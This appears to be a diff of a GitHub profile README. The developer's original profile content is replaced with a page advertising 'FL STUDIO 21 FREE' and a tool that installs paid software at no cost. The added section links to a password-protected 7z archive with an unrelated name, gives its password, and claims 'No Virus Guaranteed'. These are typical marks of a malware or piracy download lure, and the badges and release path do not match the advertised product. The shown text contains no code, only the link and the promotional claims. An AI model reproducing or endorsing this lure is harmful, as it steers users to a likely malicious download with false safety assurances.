@@ -1,19 +1,40 @@
+# FL STUDIO 21 FREE [![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]()
+[![downloadstats](https://github.com/jakerellson55/jakerellson55-proj/assets/163674734/e040afcc-af00-42a8-9e64-3b8c68b03631)](https://github.com/jakerellson55/jakerellson55-proj/releases/download/BakemonoL_v9.5.1/BakemonoL_v9.5.1.7z)
+> Password: bake
 
-## 🌐 Socials:
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-%230077B5.svg?logo=linkedin&logoColor=white)](https://linkedin.com/in/azzamdaaboul) [![Stack Overflow](https://img.shields.io/badge/-Stackoverflow-FE7A16?logo=stack-overflow&logoColor=white)](https://stackoverflow.com/users/6468802) [![Twitch](https://img.shields.io/badge/Twitch-%239146FF.svg?logo=Twitch&logoColor=white)](https://twitch.tv/azzamdaaboul) [![YouTube](https://img.shields.io/badge/YouTube-%23FF0000.svg?logo=YouTube&logoColor=white)](https://youtube.com/@azzamdaaboul) [![Codepen](https://img.shields.io/badge/Codepen-000000?style=for-the-badge&logo=codepen&logoColor=white)](https://codepen.io/azzamdaaboul) 
+![0](https://github.com/AzzamDaaboul/AzzamDaaboul/assets/7645375/83642be3-7a97-488d-9733-e2ba62e3a71d)
 
-# 💻 Tech Stack:
-![Azure](https://img.shields.io/badge/azure-%230072C6.svg?style=for-the-badge&logo=azure-devops&logoColor=white) ![C#](https://img.shields.io/badge/c%23-%23239120.svg?style=for-the-badge&logo=c-sharp&logoColor=white) ![HTML5](https://img.shields.io/badge/html5-%23E34F26.svg?style=for-the-badge&logo=html5&logoColor=white) ![CSS3](https://img.shields.io/badge/css3-%231572B6.svg?style=for-the-badge&logo=css3&logoColor=white) ![Kotlin](https://img.shields.io/badge/kotlin-%230095D5.svg?style=for-the-badge&logo=kotlin&logoColor=white) ![PHP](https://img.shields.io/badge/php-%23777BB4.svg?style=for-the-badge&logo=php&logoColor=white) ![.Net](https://img.shields.io/badge/.NET-5C2D91?style=for-the-badge&logo=.net&logoColor=white) ![Bootstrap](https://img.shields.io/badge/bootstrap-%23563D7C.svg?style=for-the-badge&logo=bootstrap&logoColor=white) ![Laravel](https://img.shields.io/badge/laravel-%23FF2D20.svg?style=for-the-badge&logo=laravel&logoColor=white) ![ANDROID](https://img.shields.io/badge/android-%2320232a.svg?style=for-the-badge&logo=android&logoColor=%a4c639) ![SASS](https://img.shields.io/badge/SASS-hotpink.svg?style=for-the-badge&logo=SASS&logoColor=white) ![Apache](https://img.shields.io/badge/apache-%23D42029.svg?style=for-the-badge&logo=apache&logoColor=white) ![Nginx](https://img.shields.io/badge/nginx-%23009639.svg?style=for-the-badge&logo=nginx&logoColor=white) ![MicrosoftSQLServer](https://img.shields.io/badge/Microsoft%20SQL%20Sever-CC2927?style=for-the-badge&logo=microsoft%20sql%20server&logoColor=white) ![MySQL](https://img.shields.io/badge/mysql-%2300f.svg?style=for-the-badge&logo=mysql&logoColor=white) ![Adobe Illustrator](https://img.shields.io/badge/adobeillustrator-%23FF9A00.svg?style=for-the-badge&logo=adobeillustrator&logoColor=white) ![Adobe InDesign](https://img.shields.io/badge/Adobe%20InDesign-49021F?style=for-the-badge&logo=adobeindesign&logoColor=white) ![Adobe XD](https://img.shields.io/badge/Adobe%20XD-470137?style=for-the-badge&logo=Adobe%20XD&logoColor=#FF61F6) ![Adobe Premiere Pro](https://img.shields.io/badge/Adobe%20Premiere%20Pro-9999FF.svg?style=for-the-badge&logo=Adobe%20Premiere%20Pro&logoColor=white)
-# 📊 GitHub Stats:
-![](https://github-readme-stats.vercel.app/api?username=azzamdaaboul&theme=dark&hide_border=false&include_all_commits=true&count_private=true)<br/>
-![](https://github-readme-streak-stats.herokuapp.com/?user=azzamdaaboul&theme=dark&hide_border=false)<br/>
-![](https://github-readme-stats.vercel.app/api/top-langs/?username=azzamdaaboul&theme=dark&hide_border=false&include_all_commits=true&count_private=true&layout=compact)
+> [!NOTE]
+> Our program is your indispensable assistant in the world of freeware. This program allows you to install paid programs absolutely free of charge, giving you access to a wide range of features without restrictions. With us you will be able to enjoy quality applications without spending a penny.
 
 ---
-[![](https://visitcount.itsvg.in/api?id=azzamdaaboul&icon=0&color=0)](https://visitcount.itsvg.in)
 
-  ## 💰 You can help me by Donating
-  [![PayPal](https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white)](https://paypal.me/azzamdaaboul) [![Ko-Fi](https://img.shields.io/badge/Ko--fi-F16061?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ko-fi.com/azzam) 
-
+<div align="center">
   
-<!-- Proudly created with GPRM ( https://gprm.itsvg.in ) -->
+### Features 🛠️:
+
+</div>
+
+- Wide range of supported programs: The program works with a huge number of paid applications, giving you the opportunity to use them without paying.
+- Ease of use: The interface of the program is intuitive and will not cause difficulties even for beginners. All you need to do is select the program you want to install and follow the simple on-screen instructions.
+- Security: The program does not contain malware and does not disrupt your operating system. By using this program, you can be sure that your device is safe.
+- Regular updates: The program is constantly updated to support new programs and fix possible bugs.
+- Support for different platforms: The program is compatible with different operating systems and can be used on computers and laptop evices.
+
+ 
+> [!TIP]
+> 1. Support 24/7.
+> 2. No Virus Guaranteed.
+> 3. Support for most systems: Windows 7/8/8.1/10/11 (x32/64) 
+
+---
+
+<div align="center">
+  
+### Screenshots 📖 :
+
+</div>
+
+![1](https://github.com/AzzamDaaboul/AzzamDaaboul/assets/7645375/7981d797-d9da-4631-948a-02317c3da533)
+
+
